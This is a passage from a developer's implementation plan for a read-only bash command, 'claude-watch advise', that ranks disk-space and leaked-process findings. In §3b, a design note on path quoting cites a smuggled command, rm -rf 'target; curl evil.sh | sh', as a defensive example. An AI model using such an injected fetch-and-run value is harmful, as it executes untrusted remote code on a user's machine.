# `claude-watch advise` — implementation plan

"What should I fix, in priority order" — **within each domain**. Read-only.
Bash + awk, no new runtime dependencies.

**v1 ships two domains: disk and leaks** (G5). CPU and memory *advice* are
deferred to v2 — §10 holds that work with its findings attached. The sampler
schema change and the linear-aggregation fix ship in v1 anyway (G8, G2), because
data only accrues forward.

Fixed by the user, not up for discussion here: bash is the application and the
skill is a thin relay; default window is a rolling 24h with week/month selectors
(this closes HANDOFF §7f); disk is in scope and must be built; nothing in this
feature deletes anything.

Three appendices are retained at the end of this file as the audit record — CEO,
ENG and DX reviews. Their findings are folded into §1–§10 below; the appendices
are history, not spec.

---

## 0. Gate decisions — settled by the user, do not re-litigate

These supersede anything below that contradicts them.

**G1 — No unified cross-domain ranking.** Rank findings *within* each domain.
The cross-domain score was never asked for and does not work: each domain divides
by its own denominator, so disk ≫ memory ≫ cpu on this machine and on every
machine, forever — a constant ordering wearing a number's clothes. `score` became
`share_of_domain`, meaningful inside one domain only.

**G2 — The O(n²) window aggregation is fixed first, in its own unit.** Measured:
1,047 samples → 0.28s, 2,095 → 0.92s, 4,191 → 3.64s (independently reproduced at
3.97s on a 64,764-row day). Extrapolated: ~15s for a day, **~13 min for a week,
~3.9 h for a month**. Week and month are non-functional, not slow. U0 fixes it.

**G3 — The sampler records cumulative CPU time.** `man ps` is explicit that `%cpu`
is "a decaying average over up to a minute of previous (real) time", and
`tools/sample.sh:29` samples exactly that — so every CPU number this tool has
produced is a smoothed estimate. `-o time=` is appended to the `ps` line.

**G4 — The `unpushed` fix and the `report` aggregation fixtures are not in this
plan.** They are **DONE**, on branch `fix/unpushed-count-and-report-fixtures`
(5 commits, smoke green). `tests/fixture-report.sh` and
`tests/fixture-worktree-unpushed.sh` exist there; `fixture-report.sh` is the
regression harness U0 lands against.

**G5 — Disk-first scope.** v1 = the disk domain + the leaks domain + the linear
aggregation fix. **CPU and memory advice are deferred to v2.** Every foundational
review finding clusters in CPU/memory; disk is the domain with the user's actual
problem (volume 96% full). §10 holds the deferred work.

> **Consequence, decided here:** v1's `domains[]` contains **exactly `disk` and
> `leaks`**. cpu and memory are *not* emitted as `unknown` domains — `unknown`
> means "we tried and could not measure", and emitting it for work that does not
> exist yet would poison `primary` and the headline. They are named in a
> top-level `deferred_domains: ["cpu","memory"]` so no consumer can mistake
> silence for a clean bill, and §5's blindness caveat is carried in `caveats[]`.

**G6 — CPU basis, when it does happen.** Difference cumulative CPU time **per
pid** for `proc` rows (they carry a pid at `sample.sh:174,179`). Keep `%cpu` for
`session` rows — they are aggregate trees with no pid, and a child exiting drops
the tree's cumulative total by its whole lifetime, so a delta there is
meaningless. `cpu_basis` is therefore **per-row-kind, not one window-level flag**.

**G7 — `advise` never scans implicitly.** With no disk cache, `advise` reports
disk `unknown` with an actionable message naming `claude-watch disk --refresh`.
A scan happens only when the user explicitly runs `claude-watch disk --refresh`.
This deletes the 120s blocking path — which was roughly the agent's Bash timeout,
on the fresh-install path. `advise --refresh` no longer exists; passing it is a
usage error that names the right command.

**G8 — the sampler change lands in v1** despite CPU advice being deferred. Sample
data only accrues forward, so starting the new era now means comparable history
already exists when CPU advice ships. Implemented per G6. **It must not regress
`report`** — a byte-identical `report --json` golden diff is a ship blocker.

---

## 1. Surface

```
claude-watch advise [--window 24h|week|month|Nh|Nd|Nw] [--json] [--show-thresholds]
claude-watch disk   [--refresh] [--json]
```

- `--window` default `24h`; `week` = `7d`, `month` = `30d`; `Nh`/`Nd`/`Nw`
  accepted. Anything else → exit 2 with a message naming every accepted form
  (§9 E1). Clamped to `CLAUDE_WATCH_KEEP_DAYS` (30); the output says so when
  clamped. Validation follows `is_uint` (`claude-watch:434`) on the numeric part.
- `--show-thresholds` prints the effective threshold table with each value's
  source (`default` or the env var that overrode it) and exits 0.
- `advise` has **no** `--refresh` (G7) and no `--domain` filter. It has no
  side-effecting path at all, so read-only is structural. `smoke.sh` asserts
  `--kill`, `--remove`, `--yes` and `--refresh` are all rejected with exit 2.
- `claude-watch disk` reads the cache. `claude-watch disk --refresh` is the
  **only** thing in this feature that scans.
- Actions are *printed*, never run.

**Exit codes** (documented in `usage()` and in README, since exit 1 already means
three things across this CLI):

| code | meaning |
|---|---|
| 0 | ran; findings may be `critical` — a full disk is not a tool failure, `doctor` is the health gate |
| 1 | the data directory is unreadable, or `disk --refresh` could not write its cache |
| 2 | usage error (bad flag, bad `--window`, bad threshold env value) |

Runtime on this machine (14 cores, 24G). Read and aggregation are separate costs:

| path | cost |
|---|---|
| window read+filter, 24h (~125k rows) | ~0.2s (measured: 60k rows in 0.07s) |
| window read, week / month | ~1s / ~4.4s + gzcat |
| window aggregation, today's shape, before U0 | 3.64s at 4,191 samples — quadratic (G2) |
| window aggregation, after U0 | linear; **budget ≤2s for a day, ≤10s for a month**, measured not estimated |
| leaks domain | ~1s (one `lsof` sweep) + git per agent worktree |
| disk domain in `advise` (cache read) | ~0 |
| `disk --refresh` cold scan | measured 10.4s for the `~/Dev` artifact pass (74 dirs, 30.3G); hard deadline 120s |

The ≤10s month figure replaces the old ≤5s budget, which did not survive
measurement: read+filter alone is ~4.4s for 3.8M rows before `gzcat` on ~28
files. The fixture asserts the *shape* (linear), not a wall-clock number that
varies by machine.

**Disk cache TTL: 6h.** Younger than 6h → used silently. Older → still used,
flagged `stale: true`, age shown (§9 E4). **Missing → disk is `unknown` with a
remedy string; nothing scans** (G7). No background refresh — the
sampler-stays-stateless invariant (HANDOFF §2) applies to the whole project.

**Discoverability.** `advise` must appear in three places or nobody will find it:
README's command block (`README:81-87`), the daily hook footer
(`claude-watch:1323`), and `usage()`.

**Environment.** All user-facing knobs are `CLAUDE_WATCH_*`; `CW_*` is reserved
for values the parent script passes to its own analyzers and is never documented
as user-settable. New in this feature: `CLAUDE_WATCH_DISK_CACHE` (default
`$DATA/state/disk.tsv`) — **not** `CW_DISK_CACHE`, which would break the prefix
used by all seven existing knobs (`claude-watch:47-52`, `README:222`) — plus the
threshold overrides in §5.

---

## 2. File layout and ownership

| file | new? | owned by |
|---|---|---|
| `claude-watch` — `report()`'s `END` block, lines ~295–332 | edit | U0 |
| `tests/fixture-aggregation.sh`, `tests/fixtures/day-golden.tsv` | new | U0 |
| `tools/sample.sh` — the `ps` line (29), its two dependent offsets, the `vm_stat` awk (72), the `sys`/`proc` prints | edit | U1 |
| `tests/fixture-sample-schema.sh` | new | U1 |
| `tools/advise.sh` | new | U2 |
| `claude-watch` — `usage()`, `advise)`/`disk)` dispatch, `status()`'s `disk`→`data_size` field, `hook()`'s footer line | edit | U2 |
| `tests/smoke.sh` — one loop that runs `tests/fixture-*.sh`, plus the new refusals | edit | U2 |
| `tests/fixture-window.sh` | new | U2 |
| `tools/disk-scan.sh` | new (executable) | U3 |
| `install.sh` — chmod list (line 20); `claude-watch` — two `doctor()` `chk` lines | edit | U3 |
| `tools/advise-disk.sh`, `tests/fixture-disk.sh` | new | U4 |
| `tools/advise-leaks.sh`, `tests/fixture-leaks.sh` | new | U5 |
| `README.md`, `skills/claude-watch/SKILL.md`, `docs/prompts/HANDOFF.md` | edit | U6 |

Three units touch `claude-watch`, in disjoint hunks: U0 inside `report()`'s `END`
(~295–332), U2 in `usage()`, `status()`, `hook()` and the dispatch `case`
(~1290–1387), U3 two lines inside `doctor()` (~1337). U1 is the sole owner of
`tools/sample.sh`.

U2 sources the analyzers **lazily inside `advise()`**, not at file scope, so the
once-a-day `hook` path (HANDOFF §6) gains nothing. It resolves them through
`REPO_DIR` (`claude-watch:17-22`), which already walks the symlink chain — `$0`
is the symlink in `~/.local/bin`. It invokes the scanner as
`bash "$REPO_DIR/tools/disk-scan.sh"`, never as a bare path, so a `git pull` that
makes `advise` live before anyone re-runs `install.sh` cannot leave a
non-executable dependency.

---

## 3. Frozen contracts

Units build against these without waiting for each other.

### 3a. Window reader and the shared scalars (U2 provides)

```
cw_read_window <seconds>      # stdout: raw TSV, oldest row first, epoch >= now-seconds
```

Iterates day files oldest→newest through `read_day` (handles `.tsv` and
`.tsv.gz`) and filters on `$1`. Order matters: aggregation closes a sample on
epoch change, so out-of-order concatenation corrupts the fold. A day present as
*both* `.tsv` and `.tsv.gz` must be read once — `read_day` prefers plain, and a
week window crosses the gzip threshold every time. A non-zero `gzcat` exit is
**detected**, not swallowed (§9 E8).

**The window is read exactly once per run.** Its awk program derives the metadata
and emits it as `M` rows ahead of any `S`/`F` rows. v1 only needs `sys` rows for
this; v2's cpu/memory analyzer folds into the same pass rather than adding a
second read (§10).

U2 derives these scalars **once** and exports them; no analyzer re-derives any of
them, because two derivations of `observed_seconds` in one JSON document can
disagree:

| export | meaning | when unavailable |
|---|---|---|
| `CW_INTERVAL_SECONDS` | derived sampling interval `iv` (§6 U0's algorithm, verbatim) | `10` (the documented fallback) |
| `CW_SAMPLES` | count of unique `sys` epochs in the window | `0` |
| `CW_OBSERVED_SECONDS` | `CW_SAMPLES × CW_INTERVAL_SECONDS` | `0` |
| `CW_READ_SECONDS` | newest minus oldest epoch actually read | `0` |
| `CW_NCPU` | `$8` of the newest `sys` row | empty |
| `CW_MEMSIZE_KB` | `$12` of the newest schema-2 `sys` row | empty |
| `CW_SWAP_CAP_MB` | `$13` of the newest schema-2 `sys` row | empty |
| `CW_VOLUME_TOTAL_KB` | `used_kb + avail_kb` from the disk cache (§3c) | empty |

**Rule for a missing denominator, binding on every analyzer:** a share whose
denominator is empty or `0` is emitted as `0`. It is never computed — `nan` and
`inf` are not valid JSON and §9 forbids them. Severity in that case comes from
the absolute threshold, which needs no denominator, and the domain records
`measurement_state: "partial"`. The leaks worktree share is the live instance of
this: `reclaim_kb / volume_total_kb` with no disk cache.

### 3b. Domain analyzer interface

Each `tools/advise-<domain>.sh` defines **two** functions: a pure
`<domain>_findings()` taking already-measured values and emitting rows, and an
impure `advise_<domain>()` that gathers inputs and calls it. The split makes
"severity is a pure function of (value, threshold)" true in code, and it is what
lets the leaks fixture run without the parent script — `advise_leaks` calls
`scan_orphans`/`scan_worktrees`, which are `claude-watch` functions.

Output is TSV on stdout: **one `S` row, then zero or more `F` rows.**

```
S  <domain>  <severity>  <measurement_state>  <reasons_csv>  <summary>  <remedy>
F  <domain>  <id>  <severity>  <share>  <value>  <unit>  <threshold>  <threshold_name>  <reclaim_kb>  <confidence>  <headline>  <detail>  <action>
```

- `severity` ∈ `critical | warn | info | ok | unknown`. `ok` = domain checked,
  nothing to do. **`ok` may never be emitted for a domain that was not actually
  measured** — that is the failure this whole tool exists to prevent, reproduced
  one level up.
- `measurement_state` ∈ `complete | partial | unavailable`. **Invariant, fixture
  asserted: `unavailable` ⟺ `severity == "unknown"`.**
- `reasons_csv` is a comma-separated subset of the §3e enum, empty when
  `complete`. `remedy` is a one-sentence string, required when the state is not
  `complete`, empty otherwise. It exists so the relay reads out a sentence
  written in bash instead of composing a scarier one (DX-13).
- `share` ∈ `0..1`, the finding's share of *its own domain's* denominator. It
  orders findings **within one domain and nowhere else** (§4). Not comparable
  across domains; the JSON field name says so.
- `value` / `threshold` in `unit` ∈ `kb | pct | count | seconds | cores`.
  `threshold_name` is the `CLAUDE_WATCH_*` knob that fired (§5), so the human
  render can print `(warn at 2% — CLAUDE_WATCH_DISK_GROUP_WARN_PCT)` and the user
  knows exactly which number to argue with.
- `reclaim_kb` 0 when not applicable. `confidence` ∈ `confirmed | likely |
  unverified | n/a` — see §3c; it gates whether an `action` may contain a removal
  command.
- `action` is a *printed* string. Every filesystem path inside it is
  single-quoted with embedded `'` escaped as `'\''`. If a path contains any byte
  outside `[A-Za-z0-9._/ +@-]` or any control byte, **no command is printed at
  all**: the finding reports the path alone (control bytes replaced by
  `tr '\001-\037\177' ' '`) with its size and "path needs manual handling".
  Quoting is always applied; the charset refusal is the second layer, because a
  correctly-quoted `rm -rf 'target; curl evil.sh | sh'` is safe to run and still
  a terrible thing to hand someone to paste.
- **Analyzers strip `\t` and `\n` from every text field before emitting**, using
  the same shape as `clean()` (`sample.sh:121`). This reverses the earlier
  "the emitter strips tabs, analyzers need not": an emitter parsing a
  tab-separated stream has already mis-split a row containing a tab, so
  `severity` reads as a number and the finding is silently garbage. U2 sanitises
  only for display (`tr`) and JSON (`jesc()`).
- Domain severity on the `S` row = worst `F` row, or `ok` when there are none and
  the domain was measured.

Inputs: `advise_disk` reads the cache at `$CLAUDE_WATCH_DISK_CACHE`;
`advise_leaks` calls `scan_orphans` / `scan_worktrees` itself. Both read
`CW_VOLUME_TOTAL_KB` and the §5 thresholds from the environment.

### 3c. Disk facts TSV (`tools/disk-scan.sh` writes it, `advise-disk.sh` reads it)

Five columns, meaning per kind:

```
epoch  -                 <unix>          -                -
scan   <partial>         <deadline_hit>  <roots_scanned>  <roots_total>
note   <reason>          <count>         -                -
vol    <mountpoint>      <used_kb>       <avail_kb>       <df_size_kb>
group  <label>           <size_kb>       <dir_count>      -
dir    <path>            <size_kb>       <group_label>    <confidence>
```

`note` rows carry the machine-readable reasons a scan was less than total:
`deadline`, `permission_denied`, `root_off_home_volume`, `path_unrepresentable`,
`depth_capped`. `advise-disk.sh` maps them onto `partial_reason` and the human
line; a cache with a `note` row and no `scan partial=1` is malformed.

**The one volume denominator, stated once.** `volume_total_kb := used_kb +
avail_kb` — the space this volume can actually use. *Every* percentage in the
disk domain divides by that and nothing else. Measured on `/System/Volumes/Data`:

| quantity | KB | human | share of `volume_total_kb` |
|---|---|---|---|
| `used_kb` | 421,562,020 | 402Gi | **95.3%** (`capacity_pct`) |
| `avail_kb` | 20,725,496 | 19.8Gi | **4.7%** (`avail_pct`) |
| `volume_total_kb` | 442,287,516 | 422Gi | 100% |
| `df` Size column | 482,797,652 | 460Gi | *not used as a denominator* |

`df`'s Size is the APFS container, which includes space this volume cannot claim;
dividing by it gives a reassuring 87.3% used on a volume with 20Gi left. `df`'s
Capacity column (96%) is computed with reserved space and is not re-derivable
from any field we publish, so it is recorded (`df_size_kb`, and Capacity in the
human output only as *df says*) and never computed against.

macOS gotcha (goes in HANDOFF §4): `df -k /` reports the sealed system volume
(46% here) and `df -k "$HOME"` reports `/System/Volumes/Data` (96%). Same free
space, wildly different `used`. An implementer who reaches for `/` gets a
reassuring, wrong answer with no symptom.

**Groups:** `rebuildable` (`.venv|venv|target|.next|DerivedData`), `node_modules`,
`transcripts` (`~/.claude/projects`, `~/.codex/sessions`), `downloads`, `caches`,
`containers` (`~/Library/Containers`, single total, no per-app breakdown).
`dir` rows are the individual hits, capped to the top 20 per group by size.

**Reclaim totals are always a floor**, labelled as such in every summary — not
only on the `partial=1` path. Three independent reasons they undercount: the
depth cap, skipped unrepresentable paths, and roots off the home volume.

**Reclaim confidence** — per `dir` row. Two independent tests:

1. *Marker*: a file that proves the directory's kind — `Cargo.toml`/`pom.xml`
   beside `target`, `package.json` beside `node_modules`/`.next`, `pyvenv.cfg`
   inside `.venv`/`venv`, an `*.xcodeproj`/`*.xcworkspace` for `DerivedData`.
2. *Idle*: newest mtime at depth 1 older than 14d.

| both | marker only | neither |
|---|---|---|
| `confirmed` — removal command printed | `likely` — size reported, no command, "in active use, rebuilt on next build" | `unverified` — size and path only, never a command |

A directory matched on **name alone gets no removal command, ever.** A hand-made
`venv` of notes and a source directory called `target` both exist in the wild,
and authoring `rm -rf` for one of them is not something a read-only tool gets to
do because a glob matched.

Rebuild cost, carried in the finding text because it is what the decision turns
on:

| group | cost to rebuild | active-use risk |
|---|---|---|
| `.next` | seconds–1 min | low; regenerated by the next `dev`/`build` |
| `target` (Rust) | minutes–tens of minutes | low if idle; a warm `cargo` cache is expensive to lose |
| `node_modules` | 1–5 min, **needs network** | breaks the project until reinstalled |
| `.venv` | 1–5 min, **needs network**, may not resolve to the same versions | breaks the project; unpinned deps may not come back identical |
| `DerivedData` | tens of minutes, and Xcode indexes again afterwards | low risk, high annoyance |

**Partial scans.** When `scan partial=1`: `disk.volume_low` comes from `df`
alone, which always completes, and keeps its true severity; every *reclaim*
finding is capped at `info`; the domain summary leads with the reason (§9 E5).
If `df` itself failed, or no cache exists, the domain is `unknown` with no
findings — **never `ok`**, which would assert a clean disk that was never
measured.

`tools/disk-scan.sh` is standalone (`CLAUDE_WATCH_REPO_ROOTS` and
`CLAUDE_WATCH_DISK_CACHE` respected) so a fixture can point it at a synthetic
tree, and so `advise-disk.sh` can be tested against a hand-written cache with no
real disk involved.

### 3d. `scan_orphans` / `scan_worktrees` shapes (pinned — U5 consumes them)

Written down here because two units and one already-merged branch must agree on a
shape nobody had recorded. `tests/fixture-leaks.sh` asserts the live column count
against `scan_worktrees 7 | head -1` so drift fails loudly rather than passing on
captured fixtures.

```
# scan_orphans  (claude-watch:452; T then its P rows, tree order)
T  <root_pid>  <name>  <age_s>  <subtree_rss_kb>  <nproc>  <subtree_cpu>
P  <root_pid>  <pid>   <depth>  <rss_kb>          <age_s>  <argv>

# scan_worktrees  (claude-watch:986-987, 9 fields)
<status>  <path>  <main>  <branch>  <age_days>  <dirty_count>  <unpushed>  <size_kb>  <why>
#  status ∈ ACTIVE | UNSAFE | STALE | RECENT | PRUNABLE
```

`unpushed` is the corrected count from the G4 branch. U5 re-implements no
classification: it consumes these as-is.

### 3e. `advise --json` — the stable contract

`schema_version: 1`. Consumers **must tolerate added fields**, and **must treat
an unknown enum value as `unavailable`, never as healthy** — that rule is the
whole reason the field exists.

```json
{
  "command": "advise",
  "schema_version": 1,
  "generated_at": 1770000000,
  "primary": {
    "state": "critical",
    "severity_rank": 4,
    "domain": "disk",
    "headline": "CRITICAL disk — 4.7% free (19.8 GiB of 422 GiB)",
    "measurement_state": "partial",
    "measurement_reasons": ["sampler_stale"]
  },
  "window": {
    "label": "24h",
    "requested_seconds": 86400,
    "read_seconds": 71230,
    "observed_seconds": 68400,
    "clamped": false,
    "requested_days": 1,
    "available_days": 2,
    "covered_days": 2,
    "missing_or_failed_days": []
  },
  "samples": 7123,
  "interval_seconds": 10,
  "cores": 14,
  "freshness": {"last_sample_epoch": 1769999940, "age_seconds": 60, "sampler_ok": true},
  "cpu_basis": {"proc": "cputime", "session": "estimate"},
  "cpu_basis_since": 1770000000,
  "deferred_domains": ["cpu", "memory"],
  "caveats": ["CPU and memory advice are not in this version ..."],
  "domains": [
    {"domain": "disk", "priority": 1, "severity": "critical", "severity_rank": 4,
     "measurement_state": "complete", "measurement_reasons": [], "partial_reason": null,
     "summary": "4.7% free; 30.3 GiB of rebuildable build output (a floor)",
     "remedy": null,
     "findings": [
       {"id": "disk.volume_low", "severity": "critical", "severity_rank": 4,
        "share_of_domain": 0.953, "value": 20725496, "unit": "kb",
        "threshold": 26214400, "threshold_name": "CLAUDE_WATCH_DISK_CRIT_GIB",
        "reclaimable_kb": 0, "confidence": "n/a",
        "headline": "...", "detail": "...", "action": null}
     ]},
    {"domain": "leaks", "priority": 2, "severity": "ok", "severity_rank": 0,
     "measurement_state": "complete", "measurement_reasons": [], "partial_reason": null,
     "summary": "no leaked processes, no removable worktrees",
     "remedy": null, "findings": []}
  ],
  "disk_scan": {"epoch": 1769980000, "age_seconds": 21600, "ttl_seconds": 21600,
                "stale": false, "scanned": true, "partial": false,
                "deadline_hit": false, "roots_scanned": 3, "roots_total": 3}
}
```

**Required at the top level:** `command`, `schema_version`, `generated_at`,
`primary`, `window`, `samples`, `freshness`, `domains`, `disk_scan`.
**Optional / may be `null`:** `cores`, `interval_seconds`, `cpu_basis`,
`cpu_basis_since`, `caveats`, and every `action`, `remedy` and `partial_reason`.
**Required on every domain object:** `domain`, `priority`, `severity`,
`severity_rank`, `measurement_state`, `measurement_reasons`, `summary`,
`findings`. **Required on every finding:** `id`, `severity`, `severity_rank`,
`share_of_domain`, `value`, `unit`, `threshold`, `threshold_name`, `headline`.

`measurement_reasons` enum — exactly these values, and nothing else:

| value | means |
|---|---|
| `no_samples` | the window contains zero `sys` rows |
| `sampler_stale` | newest sample older than the `status()` liveness threshold (120s) |
| `cache_missing` | no disk cache; nothing has ever scanned (G7) |
| `cache_malformed` | the cache exists but does not parse |
| `scan_deadline` | the recorded scan stopped at its deadline |
| `scan_permission_denied` | the recorded scan could not read part of the tree |
| `window_read_failed` | a day file failed to read or decompress |

Field notes that are contract, not decoration:

- **`primary` is the single authoritative state, and both humans and agents read
  it first.** Without it, a dead sampler yields a confident disk headline while
  other domains are silently unmeasured, and the skill would have to re-rank —
  which `skills/claude-watch/SKILL.md` explicitly forbids. Its `headline` carries
  the actionable fact, not a bare domain name.
- `primary.state` = the worst severity across all domains under §4's total order.
  Because `unknown` outranks `ok`, an all-`ok`-but-one-`unknown` run reports
  `unknown`, not `ok`. `primary.measurement_state` is the worst of the domains'
  (`unavailable` > `partial` > `complete`) and its reasons are the union.
- `severity_rank` is published as an integer so a relay never derives it.
- `share_of_domain` is named for exactly what it is (G1).
- `freshness` mirrors `status`, **reusing that function's `age < 120` constant**
  rather than inventing a second liveness definition (`claude-watch:1297,1302`).
- `cpu_basis` is an object keyed by row kind, not a scalar (G6). v1 reports it
  because the sampler change lands in v1; no v1 domain consumes it.
- `window.requested_days` / `available_days` / `covered_days` /
  `missing_or_failed_days`: two day-files exist right now, so `--window month`
  returns ~2 days of data for the next 28 days and must say so (§9 E6).
  `clamped` means *retention* clamping only, which is a different thing.
- `domains` is an array, so order is meaningful (§4) and awk's undefined array
  iteration order cannot leak into the contract. Every string derived from a
  path, argv or process name goes through `jesc()` (`claude-watch:88`, already
  fixture-proven at `smoke.sh:98-114`).
- **No `nan`, no `inf`, ever** (§3a's missing-denominator rule).

### 3f. `disk --json`

```json
{"command": "disk", "schema_version": 1, "generated_at": 1770000000,
 "disk_scan": {...}, "domain": {...}}
```

`domain` is **byte-for-byte the object `advise` puts in `domains[]` for disk**,
minus `priority`. One shape, one fixture, and an agent that learned one learned
both. `SKILL.md:16` promises the JSON is the contract; shipping a second JSON
command without one is the single thing that promise cannot survive.

---

## 4. Ordering — one rule, used everywhere

**Total severity order, published and numeric:**

```
critical (4) > warn (3) > info (2) > unknown (1) > ok (0)
```

`unknown` sits **above** `ok` deliberately: "we could not measure this" must
outrank "we measured it and it is fine", or a broken measurement reads as health.

**One ordering rule** governs the headline, the human sections and the JSON
`domains[]` array — there is no separate fixed print order:

```
sort by (severity_rank desc, then the fixed domain order disk → leaks)
```

The fixed order is a tie-break only, and it is honest about being a convention.
Each domain carries its resulting position as `priority: 1..N`. The earlier
plan's §3d-vs-§4 contradiction (fixed order in one, severity order in the other)
is what forced the relay to re-rank in violation of its own skill; it is gone.

**Findings inside a domain** sort by `(severity_rank desc, share_of_domain desc,
id ascending)`. The third key is not optional: two findings at equal severity and
equal share — trivially, two groups both rounding to 0.00 — otherwise order
nondeterministically under a hand-rolled sort and every fixture becomes flaky.

`share_of_domain` denominators, v1:

| domain | `share_of_domain` |
|---|---|
| disk volume | `used_kb / volume_total_kb` (§3c) |
| disk reclaimable | `reclaim_kb / volume_total_kb` |
| leaks worktrees | `reclaim_kb / volume_total_kb`, or `0` when the disk cache is absent (§3a) |
| leaks orphan trees | `rss_kb / memsize_kb`, or `0` when `CW_MEMSIZE_KB` is absent |

**Human output hierarchy**, decided once so it is not invented per domain:

1. `primary.headline`, carrying the actionable fact —
   `CRITICAL disk — 4.7% free (19.8 GiB of 422 GiB)`, never a bare domain name.
2. Any measurement banner (§9 E3/E4/E5/E6) directly beneath it.
3. Domain sections in §4 order. A domain that is `ok` **collapses to one line**
   naming what it was checked against.
4. Within a section: at most the top 3 findings in full with actions, then one
   line per remaining finding, then `+ N more (--json for all)`.
5. Every finding prints the threshold that fired and its knob name (§5).
6. The `caveats[]` footer.

**Severity is a word before it is a colour.** `critical` = `C_RED`, `warn` =
`C_HOT`, `info` = `C_KEY`, `ok` = `C_OK`, `unknown` = `C_DIM` plus the literal
word `unmeasured`. `claude-watch:57-63` blanks every colour when stdout is not a
tty or `NO_COLOR` is set — which is `advise | less`, `advise > file`, and every
agent invocation. The severity word prints regardless, and **`unknown` never
renders in `C_OK`**.

**Time denominator:** every rate uses `observed_seconds` (`samples × iv`), never
wall-clock window length. A laptop asleep for 8h of a 24h window must not have
its burn diluted by the sleep. `observed_seconds == 0` is a guarded case, not a
division (§9 E10).

---

## 5. Thresholds

Implemented as named constants at the top of each analyzer, each overridable by
the `CLAUDE_WATCH_*` env var named beside it, printed with every finding that
fires it, and dumped by `advise --show-thresholds`. `install.sh:20` symlinks the
repo onto PATH, so editing the installed implementation to retune a number puts
the user's edit in conflict with the next `git pull` — the env vars exist so
nobody has to. Non-integer or negative values exit 2 (`is_uint` discipline).
Every boundary is fixture-tested just below and just above.

**Disk** — all percentages against `volume_total_kb = used + avail` (§3c).

| finding | critical | warn | knobs |
|---|---|---|---|
| `disk.volume_low` (`avail_pct`, `avail_gib`) | `< 10%` **AND** `< 25GiB` | `< 20%` **AND** `< 50GiB` | `CLAUDE_WATCH_DISK_CRIT_PCT` 10, `CLAUDE_WATCH_DISK_CRIT_GIB` 25, `CLAUDE_WATCH_DISK_WARN_PCT` 20, `CLAUDE_WATCH_DISK_WARN_GIB` 50 |
| `disk.reclaimable.<group>` | inherits the volume's severity | `>= 2%` of `volume_total_kb` | `CLAUDE_WATCH_DISK_GROUP_WARN_PCT` 2 |

**`AND`, not `or`.** With `or`, on a 4TB volume 10% is 400GiB, so 399GiB free
reports `critical` — G1's deleted failure (a constant verdict wearing a number's
clothes) returning inside the disk domain. With `AND`, the absolute test binds on
a small volume and the percentage stops screaming on a large one.

Live check: 19.8Gi avail = 4.7% → under 10% **and** under 25GiB → `critical`,
unchanged by the fix. Rebuildable 30.3G = 7.2% of the 422Gi volume → over the 2%
warn line, promoted to `critical` by inheritance because it is the remedy for the
critical volume finding. "Inherits" means: severity copied from
`disk.volume_low`; `share_of_domain` stays the group's own
`reclaim_kb / volume_total_kb`; the promotion never runs downward (a group under
the warn line is not surfaced at all).

**Leaks**

| finding | warn | info | knobs |
|---|---|---|---|
| `leaks.orphans` | any tree `>= 24h` old **or** `>= 200M` | any tree at all | `CLAUDE_WATCH_LEAKS_ORPHAN_WARN_HOURS` 24, `CLAUDE_WATCH_LEAKS_ORPHAN_WARN_MB` 200 |
| `leaks.worktrees` | reclaimable `>= 1GiB` | any removable | `CLAUDE_WATCH_LEAKS_WORKTREE_WARN_GIB` 1 |

`or` is correct here and `and` is not: these are two independent symptoms of the
same leak, and either alone is worth reporting.

With 0 orphans and 0 removable worktrees (today's actual state) the domain emits
`S leaks ok complete "" "no leaked processes, no removable worktrees" ""` and no
`F` rows. Every domain must degrade to that shape.

**What v1 does not measure, and must say so.** The caveat below goes in
`caveats[]`, in the human footer, and in SKILL.md. It is not optional politeness:
heat was the original complaint that motivated this whole tool, and a tool that
prints nothing about CPU at a user whose fans are audible has failed at the one
question it was built for.

> CPU and memory advice are not in this version. Even `claude-watch report`'s CPU
> figures are partial by construction: processes under `CLAUDE_WATCH_FLOOR` (5%
> of one core) and beyond the top `CLAUDE_WATCH_TOPN` (8) per sample are never
> recorded (`sample.sh:13-15,172-180`), so twenty processes at 4% — 0.8 cores —
> produce zero rows. GPU and Neural Engine power are not measured at all (README
> Limitations). A quiet CPU report does not mean a cool machine.

The caveat points at README's Limitations section, not at HANDOFF §7c: HANDOFF is
the maintainer's decisions log, and the user-facing statement of the same limit
already lives in README.

---

## 6. Units

### U0 — linear window aggregation  **(ship blocker; G2)**
Files: `claude-watch` (`report()`'s `END` block, ~295–332),
`tests/fixture-aggregation.sh`, `tests/fixtures/day-golden.tsv`.
Depends on: nothing. (`tests/fixture-report.sh` from the G4 branch is a second
harness, not a gate — U0 carries its own golden file.)

The defect: two selection sorts with no early exit. `claude-watch:305-306` sorts
the sample-epoch array; `:318-319` sorts the gap array to take a median. 4× the
rows costs 13× the time. Week and month do not work at all until this is linear.

**The rewrite must reproduce `claude-watch:318-320` exactly.** That code takes
the element at 1-based rank `int(dn/2)+1` of an **ascending** sort — an *upper*
median, not `dn/2`. Specified, not paraphrased:

```awk
# per row, sys kind only; rows are append-only and time-ordered
if (ep != prev_ep) {
  if (prev_ep != "") {
    if (ep < prev_ep) disorder++
    gap = ep - prev_ep
    if (gap > 0 && gap < 600) { hist[gap]++; dn++ }
  }
  sysn++; prev_ep = ep; if (ep > lastep) lastep = ep
}
...
# END
need = int(dn / 2) + 1
iv = 10                                   # fallback: dn == 0
c = 0
for (g = 1; g < 600; g++) {               # NUMERIC walk. `for (g in hist)` is
  c += hist[g]                            # undefined-order in awk and gives a
  if (c >= need) { iv = g; break }        # wrong cumulative every other run.
}
covered = sysn * iv
```

Four things this pins that "walk the buckets to the middle" did not:

1. **The rank is `int(dn/2)+1`, reached by `c >= need`.** The natural thing to
   type, `c >= dn/2`, picks the wrong bucket for every even `dn`.
2. **The walk is numeric `1..599`,** never `for (g in hist)`.
3. **`iv = 10` when `dn == 0`** — a single sample, or every gap ≥ 600s (a laptop
   woken once) — must survive.
4. **`lastep` is the running max**, and `eps[]` / `sysseen[]` are deleted
   outright, not merely unsorted. A month window otherwise holds ~259k awk hash
   entries (~25MB) to dedupe epochs that adjacency already dedupes. That makes
   the aggregator constant-memory in sample count.

`iv` multiplies into `interval_seconds`, `observed_seconds` (`covered = sysn*iv`),
`active_seconds` (`sn[key]*iv`) and `cpu_seconds` (`psum[key]*iv`). An off-by-one
bucket silently rescales the entire report and every threshold decision
downstream — which is why the exact rank is specified rather than described.

**Disorder is an explicit error, not a silent semantic change.** The old code
sorted, so out-of-order rows produced a (wrongly) plausible answer; the new code
cannot. On `disorder > 0`, print to **stderr**
`claude-watch: <file> has N out-of-order sample epochs — interval and coverage
may be wrong; the raw file may be truncated or interleaved`, and continue with
the running-max result. `--json` stdout stays clean and the JSON shape does not
change; exit code stays 0.

The three ranking sorts at `:325-332` are over distinct process/session names
